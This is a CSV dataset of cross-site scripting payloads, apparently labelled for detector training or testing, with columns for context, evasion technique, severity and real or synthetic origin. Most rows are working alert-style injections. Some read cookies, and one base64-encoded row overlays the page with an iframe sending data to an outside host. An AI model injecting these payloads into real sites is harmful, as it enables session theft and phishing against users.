payload,context,technique,severity,length,source
"<style>:target {color:red;}</style><html id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></html>",event_handler,none,medium,112,real
<svg><script%20?>confirm(1),script_injection,url_encoding,medium,27,real
"<style onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</style>",event_handler,none,medium,68,real
<optgroup onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,59,real
"""><img src=""x"" onerror=""document.write(document.write(eval(atob('JzxpZnJhbWUgc3JjPSJodHRwczovL2Nvay5raW0vP2VtYWlsPScrZG9jdW1lbnQudGl0bGUrJyIgc3R5bGU9ImJvcmRlcjogMDsgcG9zaXRpb246Zml4ZWQ7IHRvcDowOyBsZWZ0OjA7IHJpZ2h0OjA7IGJvdHRvbTowOyB3aWR0aDoxMDAlOyBoZWlnaHQ6MTAwJSI+Jw==')))"" >",event_handler,encoding,high,276,real
<font onpointerdown=alert(1) style=display:block>AnonKryptiQuz</font>,event_handler,none,medium,69,real
"<h1 onmouseenter=""alert(1)"">AnonKryptiQuz</h1>",event_handler,none,medium,46,real
<svG oNbeGin=coNfiRm(1)>,tag_injection,synthetic,medium,24,synthetic
"<thead draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</thead>",event_handler,none,medium,68,real
<tr contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,56,real
<svg onfocus=confirm(document.cookie)>,tag_injection,synthetic,medium,38,synthetic
"<center id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></center>",event_handler,none,medium,88,real
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script",script_injection,none,low,83,real
"<IMG SRC=""jav&#x0D;ascript:alert(1111);"">",tag_injection,html_entity|whitespace_obfuscation|case_variation,medium,41,real
"<image2 onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</image2>",event_handler,none,medium,87,real
<svg><noembed onload=alert(1)></noembed>,event_handler,none,medium,40,real
"<video oncanplaythrough=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,none,medium,87,real
<custom tags onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,62,real
"<picture onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",event_handler,none,medium,76,real
<legend onblur=alert(1) tabindex=1 id=x></legend><input autofocus>,event_handler,none,medium,66,real
"<style>@keyframes slidein {}</style><image3 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></image3>",event_handler,none,medium,166,real
"<style>@keyframes slidein {}</style><bdo style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></bdo>",event_handler,none,medium,166,real
"j&#97;vascript:prompt(String.fromCharCode(88,83,83))",js_uri,synthetic,medium,52,synthetic
"<xmp onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</xmp>",event_handler,none,medium,79,real
<svg><content onload=alert(1)></content>,event_handler,none,medium,40,real
"""><script+src=""https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)""></script>",script_injection,none,medium,122,real
"<rt onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rt>",event_handler,none,medium,79,real
"<head onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</head>",event_handler,none,medium,69,real
"""><svg onbegin=confirm(document.cookie)>",tag_injection,synthetic,medium,40,synthetic
"<a2 draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</a2>",event_handler,none,medium,82,real
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,js_uri,none,medium,70,real
"<samp draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</samp>",event_handler,none,medium,66,real
"<progress onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></progress>",event_handler,none,medium,289,real
"<font onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</font>",event_handler,none,medium,67,real
<nobr onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</nobr><input value=clickme>,event_handler,none,medium,99,real
"<style>:target {transform: rotate(180deg);}</style><frame id=x style=""transition:transform 2s"" ontransitionrun=print()></frame>",event_handler,none,low,127,real
"<mark draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</mark>",event_handler,none,medium,66,real
""" onfocus=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) &#97;utofocus=""",attribute_escape,synthetic,medium,63,synthetic
<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>,event_handler,none,medium,79,real
"%22 onmouseenter=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,63,synthetic
"""`'><script>\x3Bjavascript:alert(0882)</script>",script_injection,none,medium,47,real
"<b onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</b>",event_handler,none,medium,59,real
"<progress onclick=""alert(1)"">AnonKryptiQuz</progress>",event_handler,none,medium,53,real
"<html onmousemove=""alert(1)"">AnonKryptiQuz</html>",event_handler,none,medium,49,real
"<noembed onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</noembed>",event_handler,none,medium,67,real
"<fieldset draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</fieldset>",event_handler,none,medium,94,real
"&lt;STYLE TYPE=\""text/javascript\""&gt;alert('AnonKryptiQuz');&lt;/STYLE&gt;",generic,none,medium,75,real
%3Cscript%3E//confirm('XSS')%3C/script%3E,script_injection,synthetic,medium,41,synthetic
"<plaintext id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></plaintext>",event_handler,none,medium,94,real
<img onlo&#97;d=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,medium,38,synthetic
<svg onfocus=consol&#101;.log(1)>,tag_injection,synthetic,medium,33,synthetic
<svg><audio onload=alert(1)></audio>,event_handler,none,medium,36,real
<noembed onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</noembed><input value=clickme>,event_handler,none,medium,114,real
%22 onbegin=console.log(document.cookie) %22,attribute_escape,synthetic,medium,44,synthetic
<script>/*/alert(1)</script>,script_injection,synthetic,medium,28,synthetic
"<progress draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",event_handler,none,medium,92,real
<h1 id=x tabindex=1 onbeforedeactivate=alert(1)></h1><input autofocus>,event_handler,none,medium,70,real
"<style>:target {color: red;}</style><input id=x style=""transition:color 10s"" ontransitioncancel=print()></input>",event_handler,none,low,112,real
<title onpointerdown=alert(1) style=display:block>AnonKryptiQuz</title>,event_handler,none,medium,71,real
"<style>:target {color: red;}</style><body id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></body>",event_handler,none,medium,111,real
"<track ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</track>",event_handler,none,medium,91,real
"<title draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</title>",event_handler,none,medium,88,real
"<IMG SRC=x onhashchange=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,63,real
<col onpointerover=alert(1) style=display:block>AnonKryptiQuz</col>,event_handler,none,medium,67,real
<input id=x onfocus=alert(1)>,event_handler,none,medium,29,real
"<colgroup onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</colgroup>",event_handler,none,medium,77,real
"<div draggable=""true"" contenteditable>drag me</div><details ondragover=alert(1) contenteditable style=display:block>drop here</details>",event_handler,none,medium,135,real
"<style>:target {transform: rotate(180deg);}</style><map id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></map>",event_handler,none,medium,124,real
"""><svg onload=confirm('XSS')>",tag_injection,synthetic,medium,29,synthetic
"<div style=""font-family:'foo&#10;;color:red;';"">XXX",attribute_escape,html_entity,low,51,real
"""%3E%3Csvg onload=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,57,synthetic
"<menu id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></menu>",event_handler,none,medium,84,real
%u003Cscript%u003Ealert('AnonKryptiQuz')%u003C/script%u003E,generic,none,medium,59,real
"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>",js_uri,none,medium,133,real
<svg onclick=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,medium,52,synthetic
<svg@load=this.alert(1)>,tag_injection,none,medium,24,real
"<p onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</p>",event_handler,none,medium,61,real
<scRipT>/*/aLerT(lOcaTioN.hAsh)</ScrIpt>,script_injection,synthetic,medium,40,synthetic
<set onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
"<table onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</table>",event_handler,none,medium,71,real
"<strong onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</strong>",event_handler,none,medium,85,real
"<input draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</input>",event_handler,none,medium,86,real
"<param draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</param>",event_handler,none,medium,88,real
"<bgsound draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</bgsound>",event_handler,none,medium,67,real
"<hgroup ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</hgroup>",event_handler,none,medium,93,real
"<?tag x=""-->"" AnonKryptiQuz=""<img src=x onerror=alert(1)//"">",event_handler,none,medium,60,real
"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,none,medium,89,real
<datalist onpointerup=alert(1) style=display:block>AnonKryptiQuz</datalist>,event_handler,none,medium,75,real
<code onblur=alert(1) tabindex=1 id=x></code><input autofocus>,event_handler,none,medium,62,real
"<style>:target {transform: rotate(180deg);}</style><ul id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></ul>",event_handler,none,medium,122,real
' onmouseover=\u0061lert(location.hash) ',attribute_escape,synthetic,medium,41,synthetic
<frameset onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</frameset>,event_handler,none,medium,82,real
"<legend onmouseup=""alert(1)"">AnonKryptiQuz</legend>",event_handler,none,medium,51,real
<optgroup onpointerout=alert(1) style=display:block>AnonKryptiQuz</optgroup>,event_handler,none,medium,76,real
%27 onbegin=console.log(%27XSS%27) %27,attribute_escape,synthetic,medium,38,synthetic
<svg onload=alert('XSS')>,tag_injection,synthetic,medium,25,synthetic
%3Cscript%3E/x/confirm(document.cookie)%3C/script%3E,script_injection,synthetic,medium,52,synthetic
"<mark id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></mark>",event_handler,none,medium,84,real
"<time oncut=""alert(1)"" contenteditable>AnonKryptiQuz</time>",event_handler,none,medium,59,real
<textarea onpointerenter=alert(1) style=display:block>AnonKryptiQuz</textarea>,event_handler,none,medium,78,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style=""position:absolute;"" onanimationcancel=""print()""></rb>",event_handler,none,low,173,real
<imG oNloAd=AleRt(LocAtiOn.HasH)/>,tag_injection,synthetic,medium,34,synthetic
<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>,event_handler,none,medium,68,real
"<img2 onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</img2>",event_handler,none,medium,69,real
"<nextid onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</nextid>",event_handler,none,medium,85,real
"<style>:target {color:red;}</style><font id=x style=""transition:color 1s"" ontransitionstart=alert(1)></font>",event_handler,none,medium,108,real
<footer onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</footer><input value=clickme>,event_handler,none,medium,103,real
"<marquee ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</marquee>",event_handler,none,medium,95,real
"<meta onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</meta>",event_handler,none,medium,69,real
%3Csvg onbegin=confirm(document.domain)/%3E,tag_injection,synthetic,medium,43,synthetic
<x contenteditable onkeypress=alert(1)>press any key!,event_handler,none,medium,53,real
"<IMG SRC=""javascript:alert(4392)""",js_uri,case_variation,medium,33,real
<listing id=x tabindex=1 onactivate=alert(1)></listing>,event_handler,none,medium,55,real
' oNtoGglE=pRomPt(DocUmeNt.DomAin) ',attribute_escape,synthetic,medium,36,synthetic
<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>,event_handler,none,medium,72,real
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search",script_injection,encoding|case_variation,medium,266,real
<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>,event_handler,none,medium,66,real
<td onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</td>,event_handler,none,medium,70,real
<input2 onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
"""%3E%3Csvg onbegin=prompt(document.cookie)%3E",tag_injection,synthetic,medium,45,synthetic
"<style>@keyframes slidein {}</style><span style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></span>",event_handler,none,medium,168,real
<ruby id=x tabindex=1 onbeforeactivate=alert(1)></ruby>,event_handler,none,medium,55,real
"""><script+src=""https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388&_=1537274810389""></script>",script_injection,none,medium,179,real
"<div draggable=""true"" contenteditable>drag me</div><a ondrop=alert(1) contenteditable style=display:block>drop here</a>",event_handler,none,medium,119,real
""" onbegin=alert(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,48,synthetic
"<svG oNloAd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection,synthetic,medium,56,synthetic
<script\x2F>javascript:alert(1)</script>,script_injection,none,medium,40,real
<script>console.log(1)</script>,script_injection,synthetic,medium,31,synthetic
%22><svg onmouseenter=prompt(document.domain)>,tag_injection,synthetic,medium,46,synthetic
%3Csvg ontoggle=confirm('XSS')/%3E,tag_injection,synthetic,medium,34,synthetic
"<select draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</select>",event_handler,none,medium,68,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style=""position:absolute;"" onanimationcancel=""print()""></div>",event_handler,none,low,175,real
<svg onerror=alert(document.domain)/>,tag_injection,synthetic,medium,37,synthetic
<svg/onload=parent[/al/.source+/ert/.source] (1)>,event_handler,none,low,49,real
<button popovertarget=x>Click me</button><address onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</address>,event_handler,none,medium,110,real
<code onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,66,real
j&#97;vascr	ipt:console.log('XSS'),js_uri,synthetic,medium,34,synthetic
"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>",event_handler,none,medium,109,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><option id=x style=""position:absolute;"" onanimationcancel=""print()""></option>",event_handler,none,low,181,real
<script>alert(1)<!–,script_injection,none,medium,19,real
"<style>@keyframes x{}</style><audio2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></audio2>",event_handler,none,medium,103,real
"<style>:target {color: red;}</style><select id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></select>",event_handler,none,medium,115,real
